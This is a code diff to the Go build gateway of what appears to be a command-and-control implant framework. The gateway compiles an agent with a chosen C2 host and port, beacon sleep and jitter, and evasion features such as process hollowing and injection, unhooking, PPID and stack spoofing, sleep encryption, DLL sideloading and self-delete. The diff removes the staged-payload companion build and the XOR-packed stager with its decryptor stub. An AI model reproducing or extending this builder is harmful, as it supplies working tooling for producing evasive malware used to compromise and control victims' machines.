@@ -231,9 +231,9 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
 			"inject-hijack": true, "inject-stomp": true, "unhook": true,
 			"ppid-spoof": true, "heap-encrypt": true, "stack-spoof": true,
-			"udrl": true, "staged-payload": true, "self-delete": true,
+			"udrl": true, "self-delete": true,
 			"channel-tcp": true, "channel-smb": true, "sleep-encrypt": true,
-			"process-hollow": true, "pack-stager": true, "dll-sideload": true,
+			"process-hollow": true, "dll-sideload": true,
 		}
 		var validated []string
 		for _, f := range features {
@@ -258,70 +258,6 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		contentType = "application/vnd.microsoft.portable-executable"
 	}
 
-	// For staged-payload builds, build the companion full-agent payload FIRST.
-	// The stager bakes DM_BUILD_UUID=buildID and fetches /stage/{buildID} at runtime.
-	// The server serves the companion payload (no staged-payload feature) from that endpoint.
-	//
-	// The stager is compiled with a minimal feature set (only what it needs to stage).
-	// Heavier evasion features belong in the payload only — they run inside the hollowed
-	// process. Including them in the stager adds static signatures to the initial binary.
-	if strings.Contains(featuresArg, "staged-payload") {
-		payloadFeatures := removeFeature(featuresArg, "staged-payload")
-		payloadImageTag := "dm-payload-build-" + buildID
-
-		// Cargo always produces the binary named after the package (binName = "dm-agent.exe").
-		// DM_BIN must match the cargo output so the Dockerfile cp succeeds.
-		payloadArgs := makeAgentBuildArgs(payloadImageTag, cargoTarget, binName, c2Host, c2Port,
-			regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-			sleepEncryptStr, payloadFeatures, campaignID, false, "", false)
-
-		payloadCmd := exec.CommandContext(ctx, "docker", payloadArgs...)
-		payloadCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
-		payloadCmd.Stdout = os.Stdout
-		payloadCmd.Stderr = os.Stderr
-		if err := payloadCmd.Run(); err != nil {
-			g.log.Error("docker build payload failed", zap.String("build_id", buildID), zap.Error(err))
-			setBuildStatus("failed", "", "")
-			return
-		}
-
-		payloadOut := "/artifacts/" + buildID + "-payload" + ext
-		payloadExtract := exec.CommandContext(ctx,
-			"docker", "run", "--rm",
-			"-v", buildVolume+":/out",
-			payloadImageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+"-payload"+ext,
-		)
-		if err := payloadExtract.Run(); err != nil {
-			g.log.Error("docker extract payload failed", zap.String("build_id", buildID), zap.Error(err))
-			setBuildStatus("failed", "", "")
-			return
-		}
-
-		exec.Command("docker", "rmi", payloadImageTag).Run() //nolint
-
-		if _, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+"-payload"+ext, payloadOut, contentType); err != nil {
-			g.log.Error("minio upload payload failed", zap.String("build_id", buildID), zap.Error(err))
-			setBuildStatus("failed", "", "")
-			return
-		}
-		os.Remove(payloadOut)
-		g.log.Info("payload companion ready", zap.String("build_id", buildID), zap.String("key", buildID+"-payload"+ext))
-	}
-
-	// When pack-stager is requested the stager is XOR-encrypted and wrapped in a
-	// tiny decryptor stub (dm-stub.exe).  The artifact delivered to the operator
-	// is dm-stub.exe; the raw stager never leaves the build container.
-	packStager := strings.Contains(featuresArg, "pack-stager")
-	// Remove pack-stager from the feature list passed to Cargo — it is a build-pipeline
-	// directive, not a Cargo feature.
-	featuresArg = removeFeature(featuresArg, "pack-stager")
-
-	// For staged-payload builds use a minimal stager feature set so the stager binary stays lean.
-	stagerFeatures := featuresArg
-	if strings.Contains(featuresArg, "staged-payload") {
-		stagerFeatures = buildStagerFeatures(featuresArg)
-	}
-
 	if signSubject != "" && !strings.HasPrefix(signSubject, "/") {
 		parts := strings.Split(signSubject, ",")
 		for i, p := range parts {
@@ -332,7 +268,7 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 
 	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
-		sleepEncryptStr, stagerFeatures, campaignID, packStager, signSubject, isDLL)
+		sleepEncryptStr, featuresArg, campaignID, signSubject, isDLL)
 
 	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
 	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
@@ -407,16 +343,11 @@ func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
 		return
 	}
 
-	extractBin := binName
-	if packStager {
-		extractBin = "dm-stub" + ext
-	}
-
 	outPath := "/artifacts/" + buildID + ext
 	extractCmd := exec.CommandContext(ctx,
 		"docker", "run", "--rm",
 		"-v", buildVolume+":/out",
-		imageTag, "sh", "-c", "cp /"+extractBin+" /out/"+buildID+ext,
+		imageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+ext,
 	)
 	if err := extractCmd.Run(); err != nil {
 		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
@@ -490,12 +421,7 @@ func appendU32LE(b []byte, v uint32) []byte {
 func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 	regPath, pollPath string, sleepSecs, jitterPct int,
 	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
-	packStager bool, signSubject string, isDLL bool) []string {
-
-	packStr := "false"
-	if packStager {
-		packStr = "true"
-	}
+	signSubject string, isDLL bool) []string {
 
 	dllStr := "false"
 	if isDLL {
@@ -519,7 +445,6 @@ func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
 		"--build-arg", "DM_UA=" + userAgent,
 		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
 		"--build-arg", "DM_FEATURES=" + features,
-		"--build-arg", "DM_PACK_STAGER=" + packStr,
 		"--build-arg", "DM_SIGN_SUBJECT=" + signSubject,
 		"--build-arg", "DM_DLL_BUILD=" + dllStr,
 	}
@@ -561,24 +486,3 @@ func nilIfEmpty(s string) *string {
 	return &s
 }
 
-// buildStagerFeatures returns the subset of features the stager binary should be
-// compiled with. The stager only needs to download the payload and hollow/inject it;
-// evasion features (sleep-encrypt, heap-encrypt, etc.) belong
-// in the companion payload which runs inside the hollowed process.
-func buildStagerFeatures(allFeatures string) string {
-	stagerAllowed := map[string]bool{
-		"staged-payload": true,
-		"udrl":           true,
-		"process-hollow": true,
-		"ppid-spoof":     true,
-		"channel-tcp":    true,
-		"channel-smb":    true,
-	}
-	var kept []string
-	for _, f := range strings.Split(allFeatures, ",") {
-		if stagerAllowed[f] {
-			kept = append(kept, f)
-		}
-	}
-	return strings.Join(kept, ",")
-}
